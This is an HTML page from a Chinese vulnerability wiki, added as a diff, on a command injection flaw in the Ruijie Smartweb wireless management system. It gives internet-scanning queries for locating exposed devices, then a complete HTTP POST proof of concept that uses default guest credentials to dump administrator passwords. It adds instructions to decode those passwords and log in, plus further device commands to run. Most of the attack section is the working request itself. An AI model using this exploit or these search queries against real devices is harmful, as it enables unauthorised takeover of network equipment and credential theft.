@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>锐捷 Smartweb管理系统 命令注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u9510\u6377 Smartweb\u7ba1\u7406\u7cfb\u7edf \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷 Smartweb管理系统密码信息泄漏漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E9%94%90%E6%8D%B7SSLVPN/%E9%94%90%E6%8D%B7RGSSLVPN%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E9%94%90%E6%8D%B7SSLVPN/%E9%94%90%E6%8D%B7RGSSLVPN%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷RG SSL VPN 垂直越权漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="smartweb">锐捷 Smartweb管理系统 命令注入漏洞<a class="headerlink" href="#smartweb" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷Smartweb系统存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>锐捷网络股份有限公司 无线smartweb管理系统</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="n">hunterapp</span><span class="p">.</span><span class="na">name</span><span class="o">=</span><span class="s">&quot;Ruijie 锐捷 Smartweb&quot;</span>
+<span class="n">fofa</span><span class="err">：</span><span class="n">title</span><span class="o">=</span><span class="s">&quot;无线smartWeb--登录页面&quot;</span>
+</code></pre></div>
+<ul>
+<li>登录页面</li>
+</ul>
+<p><img alt="1693026690199-64fbe35e-4db9-4483-9ff4-60fd93531a2c.png" src="./img/tBfsUhE5mcdw2hI_/1693026690199-64fbe35e-4db9-4483-9ff4-60fd93531a2c-041676.png" /></p>
+<p><font style="color:rgb(34, 34, 34);">1.执行查看用户名和密码POC，show webmaster users得到回显</font></p>
+<div class="highlight"><pre><span></span><code>POST /WEB_VMS/LEVEL15/ HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+Content-Length: 81
+DNT: 1
+Connection: close
+Cookie: auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302
+
+command=show webmaster users&amp;strurl=exec%04&amp;mode=%02PRIV_EXEC&amp;signname=Red-Giant.
+</code></pre></div>
+<p><img alt="1710773613327-d46e7ef8-c09c-4f7d-8b63-03f19fec9789.png" src="./img/tBfsUhE5mcdw2hI_/1710773613327-d46e7ef8-c09c-4f7d-8b63-03f19fec9789-719275.png" /></p>
+<p>base64解码后登录系统</p>
+<p><img alt="1710773670682-afc5a16e-fac1-4963-b723-b5b09ab69f6c.png" src="./img/tBfsUhE5mcdw2hI_/1710773670682-afc5a16e-fac1-4963-b723-b5b09ab69f6c-380750.png" /></p>
+<p><font style="color:rgb(34, 34, 34);">可执行其它命令</font></p>
+<div class="highlight"><pre><span></span><code>show running-config       查看当前生效的配置信息
+show interface fastethernet 0/3   查看F0/3端口信息
+show interface serial 1/2       查看S1/2端口信息
+show interface                查看所有端口信息
+show ip interface brief          以简洁方式汇总查看所有端口信息
+show ip interface         查看所有端口信息
+show version               查看版本信息
+
+锐捷交换机命令参考：
+https://www.bilibili.com/read/cv12330628
+</code></pre></div>
+<p><img alt="1710773800917-a83c0375-e631-4ae2-a877-a5ae979a7d3b.png" src="./img/tBfsUhE5mcdw2hI_/1710773800917-a83c0375-e631-4ae2-a877-a5ae979a7d3b-014295.png" /></p>
+<blockquote>
+<p>更新: 2024-06-24 11:42:27<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/cdukm3k8snxldkns">https://www.yuque.com/xiaokp7/ocvun2/cdukm3k8snxldkns</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷 Smartweb管理系统密码信息泄漏漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E9%94%90%E6%8D%B7SSLVPN/%E9%94%90%E6%8D%B7RGSSLVPN%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E9%94%90%E6%8D%B7SSLVPN/%E9%94%90%E6%8D%B7RGSSLVPN%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷RG SSL VPN 垂直越权漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
